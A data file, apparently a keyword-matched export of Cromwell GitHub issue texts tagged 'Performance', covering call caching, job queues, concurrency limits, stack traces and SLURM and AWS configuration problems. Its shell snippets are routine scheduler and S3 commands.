<#5977>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ . — You are receiving this because you commented. Reply to this email directly, view it on GitHub <[#5977 (comment)](https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EJEL23DXZQ4G3JVNQ3SPJKNNANCNFSM4S56ELLQ> . The weird thing is, even within the exact same attempt, stdout.log, stderr.log, and many side product files were successfully cached and copied to new places on S3, while only bam file failed. The only difference between bam file and other files is file size. I think this observation can exclude a lot of potential reasons.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:3259,cache,cached,3259,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,1,['cache'],['cached']
Performance,Could not find or load main class cromwell.jar,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6796:18,load,load,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6796,1,['load'],['load']
Performance,"Could not reach metadata service: [Errno 111] Connection refused. at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:76); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:536); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:543); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:80); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionResult$3(StandardAsyncExecutionActor.scala:1037); at scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). 2018-06-07 08:24:07,064 cromwell-system-akka.dispatcher",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3742:2040,concurren,concurrent,2040,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3742,1,['concurren'],['concurrent']
Performance,Could speed up our builds. https://blog.travis-ci.com/2016-05-03-caches-are-coming-to-everyone. https://github.com/spray/spray/blob/master/.travis.yml,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1297:65,cache,caches-are-coming-to-everyone,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1297,1,['cache'],['caches-are-coming-to-everyone']
Performance,Count subworkflows against the max concurrent workflows limit.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4071:35,concurren,concurrent,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4071,1,['concurren'],['concurrent']
Performance,"Create a standalone application which will:. - Create/update schema as per #3242 ; - Subscribe to a PubSub topic; - Consume events in the format emitted by the metadata implementation at #3098 ; - For each metadatum, performs any necessary upserts into CloudSQL. This system should pull events off of the message queue exactly as fast as it is writing them to the database, i.e. it shouldn't be backing up and causing Slick* errors but it should also not be dawdling either. * I'm not at all opposed to using something other than Slick. If you want to go this route, let's talk.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3244:217,perform,performs,217,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3244,2,"['perform', 'queue']","['performs', 'queue']"
Performance,Create skeleton call cache actor,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1229:21,cache,cache,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1229,1,['cache'],['cache']
Performance,"Creates hashes for the following:; - command; - backend name; - output expression; - non-file inputs (as simpletons); - file input paths (according to config). Not included in this PR:; - backend specific hashes (runtime attributes, docker, file contents). Note that if you want anything to actually be written you'll want the following options (to avoid a hashing failure); - `lookup-docker-hash=false`; - `hash-docker-names=false`; - `hash-file-paths=true` -- actually you could leave this false but... then you'd always cache hit regardless of what files you're using!; - `hash-file-contents=false`",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1290:523,cache,cache,523,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1290,1,['cache'],['cache']
Performance,CromIAM Load test,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4265:8,Load,Load,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4265,1,['Load'],['Load']
Performance,CromIAM submit endpoint optimization,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4474:24,optimiz,optimization,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4474,1,['optimiz'],['optimization']
Performance,"Cromwell (38, in this case) is saturating the available connections to our managed MySQL database. Our DBAs increased the limit and Cromwell proceeded to fill up these slots. How can we limit the number of concurrent connections to a MySQL database? There doesn't seem to be any configuration option for this.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4777:206,concurren,concurrent,206,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4777,1,['concurren'],['concurrent']
Performance,"Cromwell 37 errors when the backend submit configuration contains an expression like:; `${""-l h_vmem="" + memory + ""G""}`: ; <details>; <summary> error message </summary>; <pre><code>; cromwell.core.CromwellFatalException: common.exception.AggregatedMessageException: Error(s):; Could not evaluate expression: ""-l h_vmem="" + memory + ""G"": Cannot perform operation: -l h_vmem= + WomLong(4); at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:47); at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:38); at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Could not evaluate expression: ""-l h_vmem="" + memory + ""G"": Cannot perform operation: -l h_vmem= + WomLong(4); at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73);",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659:344,perform,perform,344,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659,4,"['concurren', 'perform']","['concurrent', 'perform']"
Performance,Cromwell call caching had seemingly random determination of which jobs were cache hits,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1494:76,cache,cache,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1494,1,['cache'],['cache']
Performance,Cromwell currently allows overrides of initialized task declarations. Confirm that call caching properly takes this into account. ```; task foo {; Int i = 3; command {}; output {; Int o = 4; }; }. workflow bar {; call foo; # should not cache to the above; call foo as foo4 { input: i = foo.o }; }; ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2451:236,cache,cache,236,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2451,1,['cache'],['cache']
Performance,Cromwell did not call-cache when expected,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1970:22,cache,cache,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1970,1,['cache'],['cache']
Performance,"Cromwell may submit more jobs to the Pipelines API than is able to run at one time, so they're held in a queue by Google Cloud. As jobs finish, the next job is run. There are a few ways to terminate a workflow (see the [Abort guide](https://cromwell.readthedocs.io/en/stable/execution/ExecutionTwists/#abort) for more information). But essentially you need Cromwell to gracefully shut down the workflow:. - In `run` mode, you can issue [SIGINT or SIGTERM](https://cromwell.readthedocs.io/en/stable/Configuring/#abort) which asks Cromwell to issue the abort requests to GCP,; - In `server` mode, you can issue an `abort` through a POST request. By running `scancel`, you may not give Cromwell sufficient time to perform this graceful shutdown process, and hence your jobs held in the GCP Pipelines queue will still execute.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5380#issuecomment-579527898:105,queue,queue,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5380#issuecomment-579527898,6,"['perform', 'queue']","['perform', 'queue']"
Performance,"Cromwell timing diagram displays SGE queued (qw) status as Running. This increases difficulty of debugging (or evaluating) a tool, since we do not have a reliable and easy(!) way to look at timing.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6070:37,queue,queued,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6070,1,['queue'],['queued']
Performance,"Cromwell's requester pays logic works by trying to perform GCS operations without specifying a project to bill. If the operation is successful, great, all done. If the operation is not successful and the error message looks like a requester pays error, the operation is retried with the project to bill specified. IIRC this system is in place because always specifying the project to bill resulted in the project being billed even if the bucket was not requester pays. It's unfortunate this logic needs to be so clunky when GCS does have the concept of [provisional user projects](https://developers.google.com/resources/api-libraries/documentation/storage/v1/java/latest/com/google/api/services/storage/Storage.Buckets.GetIamPolicy.html#setProvisionalUserProject-java.lang.String-) but this concept is not supported in the Google Storage API used by the GCS filesystem. Anyway the ""is this requester pays"" logic used to look for exact matches to an error message string, i.e. exactly this:; ```; Bucket is requester pays bucket but no user project provided.; ```; However with increasing probability (the `requester_pays_engine_functions` Centaur test fails about 50% of the time with the baseline Cromwell code) we are seeing error messages that actually look like this:; ```; 400 Bad Request; POST https://storage.googleapis.com/upload/storage/v1/b/cromwell_bucket_with_requester_pays/o?projection=full&uploadType=multipart; {; ""error"": {; ""code"": 400,; ""message"": ""Bucket is requester pays bucket but no user project provided."",; ""errors"": [; {; ""message"": ""Bucket is requester pays bucket but no user project provided."",; ""domain"": ""global"",; ""reason"": ""required""; }; ]; }; }; ```. The changes here accommodate either version of the error message with a `null`-safe `contains` check courtesy Apache StringUtils.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6556:51,perform,perform,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6556,1,['perform'],['perform']
Performance,"Cromwell-59 still has this problem. `cacheCopy` >= 5MB always has a different etag so it effectively disables call-caching due to different etag. ![image](https://user-images.githubusercontent.com/8625660/119712953-05280980-be16-11eb-8b0b-bdf057f7d2ca.png). So the original file's etag doesn't have `-` in etag (no multipart uploading).; ```; $ aws s3api head-object --bucket encode-processing --key test-copy-etag/ENCFF641SFZ.trim.srt.nodup.no_chrM_MT.tn5.tagAlign.gz; {; ""AcceptRanges"": ""bytes"",; ""LastModified"": ""Wed, 26 May 2021 18:26:37 GMT"",; ""ContentLength"": 164184869,; ""ETag"": ""\""0502111c7c676115303cca9931c2769b\"""",; ""ContentType"": ""binary/octet-stream"",; ""ServerSideEncryption"": ""AES256"",; ""Metadata"": {}; }; ```. Tried to copy it to a temp location (mimicking `cacheCopy`).; ```; $ aws s3 cp s3://encode-processing/caper_out_v052521/atac/d249d56c-fcdb-4916-a830-2c191920d877/call-bam2ta/shard-0/glob-199637d3015dccbe277f621a18be9eb4/ENCFF641SFZ.trim.srt.nodup.no_chrM_MT.tn5.tagAlign.gz s3://encode-processing/test-copy-etag/; copy: s3://encode-processing/caper_out_v052521/atac/d249d56c-fcdb-4916-a830-2c191920d877/call-bam2ta/shard-0/glob-199637d3015dccbe277f621a18be9eb4/ENCFF641SFZ.trim.srt.nodup.no_chrM_MT.tn5.tagAlign.gz to s3://encode-processing/test-copy-etag/ENCFF641SFZ.trim.srt.nodup.no_chrM_MT.tn5.tagAlign.gz. $ aws s3api head-object --bucket encode-processing --key test-copy-etag/ENCFF641SFZ.trim.srt.nodup.no_chrM_MT.tn5.tagAlign.gz; {; ""AcceptRanges"": ""bytes"",; ""LastModified"": ""Wed, 26 May 2021 18:27:41 GMT"",; ""ContentLength"": 164184869,; ""ETag"": ""\""a11d42b4abf4ef9d5de40183f25c520b-20\"""",; ""ContentType"": ""binary/octet-stream"",; ""ServerSideEncryption"": ""AES256"",; ""Metadata"": {}; }; ```. Got a different etag which matches with etag of the above snapshot. If `copy` method is used for `s3.caching.duplication-strategy` then call-caching is effectively disabled for all files > 5MB. . There is another bug in AWS backend's `s3.caching.duplication-strategy`.; https://gi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-849027075:37,cache,cacheCopy,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-849027075,2,['cache'],['cacheCopy']
Performance,"Cromwell: 36. I had the following config file, missing a brace:. ```; backend {; default = spartan. providers {; spartan {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 2; Int requested_memory_mb_per_core = 8000; String queue = ""short""; """""". submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""/bin/bash ${script}""; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; ; }; }; }; ```. When I ran `java -Dconfig.file=$(realpath spartan.conf) -jar cromwell-36.jar`, the error it printed was:. ```; Exception in thread ""main"" java.lang.ExceptionInInitializerError; 	at cromwell.CromwellApp$.runCromwell(CromwellApp.scala:14); 	at cromwell.CromwellApp$.delayedEndpoint$cromwell$CromwellApp$1(CromwellApp.scala:25); 	at cromwell.CromwellApp$delayedInit$body.apply(CromwellApp.scala:3); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); 	at scala.App.main(App.scala:76); 	at scala.App.main$(App.scala:74); 	at cromwell.CromwellApp$.main(CromwellApp.scala:3); 	at cromwell.CromwellApp.main(CromwellApp.scala); Caused by: com.typesafe.config.ConfigException$Parse: /data/cephfs/punim0751/spartan.conf: 27: expecting a close parentheses ')' here, not: end of file; 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseError(ConfigDocumentParser.java:201); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseError(ConfigDocumentParser.java:197); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseKey(Con",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4549:336,queue,queue,336,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4549,2,['queue'],['queue']
Performance,"Currently a new job definition is created per job submitted to AWS Batch. There should be built into AwsBatchJob.scala a mechanism to reuse definitions. One thought here is to perform a hash of the parameters used to create a job definition, then setting the job definition name to that hash. It is then relatively easy to perform a describeJobDefinitions call against aws batch to look for that name, and create it if it does not exist.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3750:176,perform,perform,176,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3750,2,['perform'],['perform']
Performance,Currently all output files will be kept. In most cases not all output files need to be kept and only wasting a lot of disk space. When having to not a lot of diskspace available might block a full scale pipeline run. To do this each jobs and/or (sub)workflow should have a runtime tag `intermediate: Boolean` or `intermediate_files: Array[File]`. When no downstream dependency need those files anymore they can be removed during the pipeline run. The same functionality was already implemented in GATK/Queue.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3881:502,Queue,Queue,502,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3881,1,['Queue'],['Queue']
Performance,"Currently the Job Store doesn't cope with File outputs at all. See the discussion at #1340 for thoughts about doing this in a futureproof way. Also think about the how much logic will be shared with call cache results in #1233, and particularly about factoring out the simpleton nature in the job store and call cache result simpletons.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1349:204,cache,cache,204,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1349,2,['cache'],['cache']
Performance,"Currently the cromwell.conf file specifies the ARN of the queue that jobs; are submitted to. You can either change this to a new queue or you can; change the queue to use (or prioritize) a compute environment that uses on; demand instances. On Thu, Nov 19, 2020 at 2:32 PM Richard Davison <notifications@github.com>; wrote:. > If it works the same approach would allow for recovery in the case of Spot; > interruption; >; > By the way, speaking of this, how would I submit a job to an on-demand; > compute environment manually? It seems whenever I submit a workflow to; > cromwell, it always runs in a spot instance.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730590208>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EPPHWFJT3BFIOU2TCLSQVXFVANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-731151345:58,queue,queue,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-731151345,3,['queue'],['queue']
Performance,"Currently we have the ability to turn caching on/off at a cromwell level, or a workflow level, but sometimes there are specific tasks in a workflow that should either participate or not in call caching. Similar to the workflow options, a task-level runtime set of options should exist to expose this behavior:; write_to_cache: don't add the results of this call to the cache; read_from_cache: don't attempt to use the cache for this call. Requested by Lee as they migrate off Queue",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1695:369,cache,cache,369,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1695,3,"['Queue', 'cache']","['Queue', 'cache']"
Performance,"Currently, does cromwell support the situation where several concurrent cromwell instances share the same MySQL database? Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4842#issuecomment-487338033:61,concurren,concurrent,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4842#issuecomment-487338033,1,['concurren'],['concurrent']
Performance,"Currently, the local backend will spawn the maximum number of processes to run a workflow. . Why is this a problem? ; - This can cripple a machine with fewer CPUs than number of tasks that can be executed.; - This can cause all of the RAM to be used running a workflow. Again, crippling a machine.; - If either of the two above conditions are met, total wall clock time will increase and/or jobs will be killed and/or the cromwell process will be killed.; - This hinders the development of pipelines. Proposed solution:; - Allow users to specify the maximum number of simultaneous jobs to run for a workflow. Similar to how it is done in Queue. Workaround:; - Use JES, if available; - Use SGE, if available. Who?; - Pipeline engineers; - Method developers; - External researchers",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1354:638,Queue,Queue,638,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1354,1,['Queue'],['Queue']
Performance,Cut out KV Store in JES abort to sidestep a race condition. Closes #1253,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1410:44,race condition,race condition,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1410,1,['race condition'],['race condition']
Performance,DSDEEPB-521 Fix race condition causing calls to be started multiple times.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/47:16,race condition,race condition,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/47,1,['race condition'],['race condition']
Performance,"D_GCS=https://storage.googleapis.com/cos-tools; + COS_KERNEL_SRC_GIT=https://chromium.googlesource.com/chromiumos/third_party/kernel; + COS_KERNEL_SRC_ARCHIVE=kernel-src.tar.gz; + TOOLCHAIN_URL_FILENAME=toolchain_url; + TOOLCHAIN_ARCHIVE=toolchain.tar.xz; + TOOLCHAIN_ENV_FILENAME=toolchain_env; + CHROMIUMOS_SDK_GCS=https://storage.googleapis.com/chromiumos-sdk; + ROOT_OS_RELEASE=/root/etc/os-release; + KERNEL_SRC_DIR=/build/usr/src/linux; + NVIDIA_DRIVER_VERSION=418.40.04; + NVIDIA_DRIVER_MD5SUM=; + NVIDIA_INSTALL_DIR_HOST=/var/lib/nvidia; + NVIDIA_INSTALL_DIR_CONTAINER=/usr/local/nvidia; + ROOT_MOUNT_DIR=/root; + CACHE_FILE=/usr/local/nvidia/.cache; + LOCK_FILE=/root/tmp/cos_gpu_installer_lock; + LOCK_FILE_FD=20; + set +x; [INFO 2020-08-04 23:40:07 UTC] Checking if this is the only cos-gpu-installer that is running.; [INFO 2020-08-04 23:40:07 UTC] Running on COS build id 12871.1174.0; [INFO 2020-08-04 23:40:07 UTC] Checking if third party kernel modules can be installed; [INFO 2020-08-04 23:40:07 UTC] Checking cached version; [INFO 2020-08-04 23:40:07 UTC] Cache file /usr/local/nvidia/.cache not found.; [INFO 2020-08-04 23:40:07 UTC] Did not find cached version, building the drivers...; [INFO 2020-08-04 23:40:07 UTC] Downloading GPU installer ...; [INFO 2020-08-04 23:40:09 UTC] Downloading from https://storage.googleapis.com/nvidia-drivers-us-public/tesla/418.40.04/NVIDIA-Linux-x86_64-418.40.04.run; ls: cannot access '/build/usr/src/linux': No such file or directory; [INFO 2020-08-04 23:40:11 UTC] Kernel sources not found locally, downloading; [INFO 2020-08-04 23:40:11 UTC] Kernel source archive download URL: https://storage.googleapis.com/cos-tools/12871.1174.0/kernel-src.tar.gz. real	0m2.220s; user	0m0.183s; sys	0m0.338s; [INFO 2020-08-04 23:40:18 UTC] Setting up compilation environment; [INFO 2020-08-04 23:40:18 UTC] Obtaining toolchain_env file from https://storage.googleapis.com/cos-tools/12871.1174.0/toolchain_env. real	0m0.126s; user	0m0.014s; sys	0m0.001s; ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5714:3467,cache,cached,3467,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5714,2,"['Cache', 'cache']","['Cache', 'cached']"
Performance,"DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19];   at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19];   at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19];   at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19];   at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19];   at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19];   at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19];   at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19];   at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19];   at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19];   at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19];   at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19];   at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19];   at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19];   at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19];   at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; 2016-05-10 11:38:08,737 cromwell-system-akka.actor.default-dispatcher-3 INFO  - WorkflowActor [UUID(972b838f)]: persisting status of CollectUnsortedReadgroupBamQualityMetrics:10 to Failed.; 2016-05-10 11:38:08,738 cromwell-system-akka.actor.default-dispatcher-3 ERROR - WorkflowActor [UUID(972b838f)]: Read timed out",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/826:7878,concurren,concurrent,7878,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/826,6,['concurren'],['concurrent']
Performance,De-dupe EJEA events if call cache writing is enabled. Closes #1900,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1942:28,cache,cache,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1942,1,['cache'],['cache']
Performance,"Dear Alexis,; many thanks - I really appreciate the very useful inputs!; I asked the team operating the slurm server and they say that no such limits are in effect. The number of permitted jobs is oddly specific, it stays at maximum 37 jobs (either pending or running). It really appears that cromwell is doing something to stop further submission of jobs (they are tracked as ""Running"" in cromwell but no call within a job takes place until there are slots available). ; Once the jobs submitted exceed this queue, then cromwell server only generates this log:; ```; 2020-07-08 17:13:15,328 INFO - MaterializeWorkflowDescriptorActor [UUID(9db83645)]: Parsing workflow as WDL 1.0; 2020-07-08 17:13:16,442 INFO - MaterializeWorkflowDescriptorActor [UUID(9db83645)]: Call-to-Backend assignments: FastqToVCF.VariantFiltrationSNP -> slurm; ```; And then waits in this state until another job is finished, without even checking if the call is cached or anything else. Please note that the number of permitted workflows is set to a value higher than the number of workflows we usually submit. . One interesting observation - if I stop the cromwell server process (Control-C), all the jobs that were not previously submitted to slurm, get submitted immediately (as if cromwell was constantly blocking the submission for an unclear reason). Any input is, again, very much valuable! Thanks a lot. Ps. I just wanted to add that adding a second server process and submitting tasks to it allows submitting more jobs, so it is very likely that the slurm system is not limiting submissions.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5218#issuecomment-655622391:508,queue,queue,508,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5218#issuecomment-655622391,2,"['cache', 'queue']","['cached', 'queue']"
